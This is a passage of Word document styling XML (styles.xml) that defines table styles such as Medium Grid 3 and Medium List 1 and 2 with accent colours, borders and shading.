        <w:shd w:val="clear" w:color="auto" w:fill="50F0FF" w:themeFill="accent4" w:themeFillTint="7F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:insideH w:val="single" w:sz="6" w:space="0" w:color="00929F" w:themeColor="accent4"/>
          <w:insideV w:val="single" w:sz="6" w:space="0" w:color="00929F" w:themeColor="accent4"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="50F0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1E5272" w:themeColor="accent5"/>
        <w:left w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="accent5"/>
        <w:bottom w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="accent5"/>
        <w:right w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="accent5"/>
        <w:insideH w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="accent5"/>
        <w:insideV w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="accent5"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tcPr>
      <w:shd w:val="clear" w:color="auto" w:fill="B7D7EC" w:themeFill="accent5" w:themeFillTint="3F"/>
    </w:tcPr>
    <w:tblStylePr w:type="firstRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:color w:val="1E5272" w:themeColor="text1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="E2EFF7" w:themeFill="accent5" w:themeFillTint="19"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:color w:val="1E5272" w:themeColor="text1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="12" w:space="0" w:color="1E5272" w:themeColor="text1"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="firstCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:color w:val="1E527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E5272" w:themeColor="text1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="C4DFEF" w:themeFill="accent5" w:themeFillTint="33"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Vert">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="6EB0D9" w:themeFill="accent5" w:themeFillTint="7F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:insideH w:val="single" w:sz="6" w:space="0" w:color="1E5272" w:themeColor="accent5"/>
          <w:insideV w:val="single" w:sz="6" w:space="0" w:color="1E5272" w:themeColor="accent5"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="6EB0D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007698" w:themeColor="accent6"/>
        <w:left w:val="single" w:sz="8" w:space="0" w:color="007698" w:themeColor="accent6"/>
        <w:bottom w:val="single" w:sz="8" w:space="0" w:color="007698" w:themeColor="accent6"/>
        <w:right w:val="single" w:sz="8" w:space="0" w:color="007698" w:themeColor="accent6"/>
        <w:insideH w:val="single" w:sz="8" w:space="0" w:color="007698" w:themeColor="accent6"/>
        <w:insideV w:val="single" w:sz="8" w:space="0" w:color="007698" w:themeColor="accent6"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tcPr>
      <w:shd w:val="clear" w:color="auto" w:fill="A6EAFF" w:themeFill="accent6" w:themeFillTint="3F"/>
    </w:tcPr>
    <w:tblStylePr w:type="firstRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:color w:val="1E5272" w:themeColor="text1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="DBF6FF" w:themeFill="accent6" w:themeFillTint="19"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:color w:val="1E5272" w:themeColor="text1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="12" w:space="0" w:color="1E5272" w:themeColor="text1"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="firstCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:color w:val="1E527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E5272" w:themeColor="text1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="B7EEFF" w:themeFill="accent6" w:themeFillTint="33"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Vert">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="4CD6FF" w:themeFill="accent6" w:themeFillTint="7F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:insideH w:val="single" w:sz="6" w:space="0" w:color="007698" w:themeColor="accent6"/>
          <w:insideV w:val="single" w:sz="6" w:space="0" w:color="007698" w:themeColor="accent6"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="4CD6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E0F3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D7E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E5272"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E5272"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E5272"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E5272"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B0D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B0D9" w:themeFill="text1" w:themeFillTint="7F"/>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="MediumGrid3-Accent1">
    <w:name w:val="Medium Grid 3 Accent 1"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="69"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="006E0F3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C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727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727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727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727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B8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B8BE" w:themeFill="accent1" w:themeFillTint="7F"/>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="MediumGrid3-Accent2">
    <w:name w:val="Medium Grid 3 Accent 2"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="69"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="006E0F3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2C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94D2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94D2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94D2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94D2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A58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A58F" w:themeFill="accent2" w:themeFillTint="7F"/>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="MediumGrid3-Accent3">
    <w:name w:val="Medium Grid 3 Accent 3"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="69"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="006E0F3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E9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7A8B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7A8B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7A8B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7A8B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D3D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D3D7" w:themeFill="accent3" w:themeFillTint="7F"/>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="MediumGrid3-Accent4">
    <w:name w:val="Medium Grid 3 Accent 4"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="69"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="006E0F3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8F7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29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29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29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29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0F0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0F0FF" w:themeFill="accent4" w:themeFillTint="7F"/>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="MediumGrid3-Accent5">
    <w:name w:val="Medium Grid 3 Accent 5"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="69"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="006E0F3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D7E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E527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E527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E527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E527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B0D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B0D9" w:themeFill="accent5" w:themeFillTint="7F"/>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="MediumGrid3-Accent6">
    <w:name w:val="Medium Grid 3 Accent 6"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="69"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="006E0F3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EA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69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69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69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69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CD6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CD6FF" w:themeFill="accent6" w:themeFillTint="7F"/>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="MediumList1">
    <w:name w:val="Medium List 1"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="65"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:color w:val="1E5272" w:themeColor="text1"/>
    </w:rPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
      <w:tblBorders>
        <w:top w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="text1"/>
        <w:bottom w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="text1"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tblStylePr w:type="firstRow">
      <w:rPr>
        <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="nil"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="text1"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:color w:val="000000" w:themeColor="text2"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="text1"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="text1"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="firstCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="text1"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="text1"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Vert">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="B7D7EC" w:themeFill="text1" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="B7D7EC" w:themeFill="text1" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="MediumList1-Accent1">
    <w:name w:val="Medium List 1 Accent 1"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="65"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:color w:val="1E5272" w:themeColor="text1"/>
    </w:rPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
      <w:tblBorders>
        <w:top w:val="single" w:sz="8" w:space="0" w:color="68727B" w:themeColor="accent1"/>
        <w:bottom w:val="single" w:sz="8" w:space="0" w:color="68727B" w:themeColor="accent1"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tblStylePr w:type="firstRow">
      <w:rPr>
        <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="nil"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="68727B" w:themeColor="accent1"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:color w:val="000000" w:themeColor="text2"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="68727B" w:themeColor="accent1"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="68727B" w:themeColor="accent1"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="firstCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="68727B" w:themeColor="accent1"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="68727B" w:themeColor="accent1"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Vert">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="D9DCDF" w:themeFill="accent1" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="D9DCDF" w:themeFill="accent1" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="MediumList1-Accent2">
    <w:name w:val="Medium List 1 Accent 2"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="65"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:color w:val="1E5272" w:themeColor="text1"/>
    </w:rPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
      <w:tblBorders>
        <w:top w:val="single" w:sz="8" w:space="0" w:color="D94D22" w:themeColor="accent2"/>
        <w:bottom w:val="single" w:sz="8" w:space="0" w:color="D94D22" w:themeColor="accent2"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tblStylePr w:type="firstRow">
      <w:rPr>
        <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="nil"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="D94D22" w:themeColor="accent2"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:color w:val="000000" w:themeColor="text2"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="D94D22" w:themeColor="accent2"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="D94D22" w:themeColor="accent2"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="firstCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="D94D22" w:themeColor="accent2"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="D94D22" w:themeColor="accent2"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Vert">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F6D2C7" w:themeFill="accent2" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F6D2C7" w:themeFill="accent2" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="MediumList1-Accent3">
    <w:name w:val="Medium List 1 Accent 3"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="65"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:color w:val="1E5272" w:themeColor="text1"/>
    </w:rPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
      <w:tblBorders>
        <w:top w:val="single" w:sz="8" w:space="0" w:color="A7A8B0" w:themeColor="accent3"/>
        <w:bottom w:val="single" w:sz="8" w:space="0" w:color="A7A8B0" w:themeColor="accent3"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tblStylePr w:type="firstRow">
      <w:rPr>
        <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="nil"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="A7A8B0" w:themeColor="accent3"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:color w:val="000000" w:themeColor="text2"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="A7A8B0" w:themeColor="accent3"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="A7A8B0" w:themeColor="accent3"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="firstCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="A7A8B0" w:themeColor="accent3"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="A7A8B0" w:themeColor="accent3"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Vert">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="E9E9EB" w:themeFill="accent3" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="E9E9EB" w:themeFill="accent3" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="MediumList1-Accent4">
    <w:name w:val="Medium List 1 Accent 4"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="65"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:color w:val="1E5272" w:themeColor="text1"/>
    </w:rPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
      <w:tblBorders>
        <w:top w:val="single" w:sz="8" w:space="0" w:color="00929F" w:themeColor="accent4"/>
        <w:bottom w:val="single" w:sz="8" w:space="0" w:color="00929F" w:themeColor="accent4"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tblStylePr w:type="firstRow">
      <w:rPr>
        <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="nil"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="00929F" w:themeColor="accent4"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:color w:val="000000" w:themeColor="text2"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="00929F" w:themeColor="accent4"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="00929F" w:themeColor="accent4"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="firstCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="00929F" w:themeColor="accent4"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="00929F" w:themeColor="accent4"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Vert">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="A8F7FF" w:themeFill="accent4" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="A8F7FF" w:themeFill="accent4" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="MediumList1-Accent5">
    <w:name w:val="Medium List 1 Accent 5"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="65"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:color w:val="1E5272" w:themeColor="text1"/>
    </w:rPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
      <w:tblBorders>
        <w:top w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="accent5"/>
        <w:bottom w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="accent5"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tblStylePr w:type="firstRow">
      <w:rPr>
        <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="nil"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="accent5"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:color w:val="000000" w:themeColor="text2"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="accent5"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="accent5"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="firstCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="accent5"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="accent5"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Vert">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="B7D7EC" w:themeFill="accent5" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="B7D7EC" w:themeFill="accent5" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="MediumList1-Accent6">
    <w:name w:val="Medium List 1 Accent 6"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="65"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:color w:val="1E5272" w:themeColor="text1"/>
    </w:rPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
      <w:tblBorders>
        <w:top w:val="single" w:sz="8" w:space="0" w:color="007698" w:themeColor="accent6"/>
        <w:bottom w:val="single" w:sz="8" w:space="0" w:color="007698" w:themeColor="accent6"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tblStylePr w:type="firstRow">
      <w:rPr>
        <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="nil"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="007698" w:themeColor="accent6"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:color w:val="000000" w:themeColor="text2"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="007698" w:themeColor="accent6"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="007698" w:themeColor="accent6"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="firstCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="007698" w:themeColor="accent6"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="007698" w:themeColor="accent6"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Vert">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="A6EAFF" w:themeFill="accent6" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="A6EAFF" w:themeFill="accent6" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="MediumList2">
    <w:name w:val="Medium List 2"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="66"/>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1E5272" w:themeColor="text1"/>
        <w:left w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="text1"/>
        <w:bottom w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="text1"/>
        <w:right w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="text1"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tblStylePr w:type="firstRow">
